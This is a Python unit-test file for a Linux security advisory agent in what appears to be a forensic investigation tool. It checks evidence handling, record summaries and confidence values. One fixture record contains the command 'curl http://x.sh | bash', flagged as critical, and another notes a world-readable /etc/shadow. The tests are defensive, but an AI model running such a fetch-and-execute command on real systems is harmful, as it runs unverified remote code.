"""Unit tests for core/agents/linux_security_agent.py — agent-level test
invoking the node function directly (constitution §11), independent of
graph orchestration."""

from __future__ import annotations

from datetime import UTC, datetime

import pytest

from core.agents.contracts import ExecutionStatus
from core.agents.linux_security_agent import (
    LinuxSecurityAgent,
    default_linux_security_agent_tool_registry,
)
from core.graph.state import CaseInvestigationState
from core.parsers.models import ChainOfCustody, EvidenceType, NormalizedEvidence

pytestmark = pytest.mark.unit


def _custody() -> ChainOfCustody:
    return ChainOfCustody(
        ingested_at=datetime.now(UTC),
        ingested_by="tester",
        original_filename="commands.txt",
        sha256="a" * 64,
        file_size_bytes=100,
    )


def _linux_input_evidence(
    evidence_type: EvidenceType = EvidenceType.LINUX_COMMAND_INPUT,
) -> NormalizedEvidence:
    return NormalizedEvidence(
        evidence_type=evidence_type,
        source="commands.txt",
        parser_name="linux_command_input",
        parser_version="1.0.0",
        confidence=1.0,
        records=[],
        chain_of_custody=_custody(),
    )


def _agent() -> LinuxSecurityAgent:
    return LinuxSecurityAgent(tool_registry=default_linux_security_agent_tool_registry())


def test_no_evidence_is_degraded_not_a_false_clean_bill() -> None:
    agent = _agent()
    state = CaseInvestigationState()
    result_state = agent(state)
    assert result_state.agent_outputs[agent.name].status == ExecutionStatus.DEGRADED


def test_non_linux_input_evidence_is_skipped_not_analyzed() -> None:
    agent = _agent()
    log_evidence = NormalizedEvidence(
        evidence_type=EvidenceType.SSH_AUTH,
        source="auth.log",
        parser_name="ssh_auth",
        parser_version="1.0.0",
        confidence=1.0,
        records=[],
        chain_of_custody=_custody(),
    )
    state = CaseInvestigationState(evidence=[log_evidence])
    result_state = agent(state)
    output = result_state.agent_outputs[agent.name]
    assert output.status == ExecutionStatus.DEGRADED
    assert output.output["skipped_non_command_items"] == 1


def test_summarizes_hydrated_advisory_records() -> None:
    agent = _agent()
    state = CaseInvestigationState(
        evidence=[_linux_input_evidence()],
        linux_advisory_records=[
            {
                "kind": "command",
                "command_name": "curl",
                "raw_text": "curl http://x.sh | bash",
                "severity": "critical",
                "confidence": 0.9,
                "explanation": "dangerous",
                "matched_rule_count": 1,
            },
            {
                "kind": "permission",
                "filename": "/etc/shadow",
                "raw_text": "-rw-r--r--",
                "severity": "critical",
                "confidence": 0.9,
                "explanation": "world readable",
                "matched_rule_count": 1,
            },
            {
                "kind": "hardening",
                "category": "file_permissions",
                "recommendation": "tighten",
                "is_baseline": False,
            },
            {
                "kind": "summary",
                "overall_risk_level": "critical",
                "overall_confidence": 0.9,
                "overall_explanation": "2 findings",
                "skipped_line_count": 0,
            },
        ],
    )
    result_state = agent(state)
    output = result_state.agent_outputs[agent.name]
    assert output.status == ExecutionStatus.SUCCEEDED
    advice = output.output["advice"]
    assert advice["command_count"] == 1
    assert advice["permission_count"] == 1
    assert advice["overall_risk_level"] == "critical"
    assert advice["hardening_recommendation_count"] == 1


def test_malformed_advisory_record_entries_are_skipped_not_crashed() -> None:
    agent = _agent()
    state = CaseInvestigationState(
        evidence=[_linux_input_evidence()],
        linux_advisory_records=["not-a-dict", {"kind": "command"}, 42],
    )
    result_state = agent(state)
    output = result_state.agent_outputs[agent.name]
    assert output.status == ExecutionStatus.SUCCEEDED


def test_no_records_yet_still_succeeds_with_zero_summary() -> None:
    agent = _agent()
    state = CaseInvestigationState(evidence=[_linux_input_evidence()], linux_advisory_records=[])
    result_state = agent(state)
    output = result_state.agent_outputs[agent.name]
    assert output.status == ExecutionStatus.SUCCEEDED
    assert output.output["advice"]["command_count"] == 0


def test_advice_appended_to_state_findings() -> None:
    agent = _agent()
    state = CaseInvestigationState(evidence=[_linux_input_evidence()], linux_advisory_records=[])
    result_state = agent(state)
    assert len(result_state.findings) == 1


def test_confidence_is_always_deterministic() -> None:
    agent = _agent()
    state = CaseInvestigationState(evidence=[_linux_input_evidence()], linux_advisory_records=[])
    result_state = agent(state)
    output = result_state.agent_outputs[agent.name]
    assert output.confidence.value == 1.0
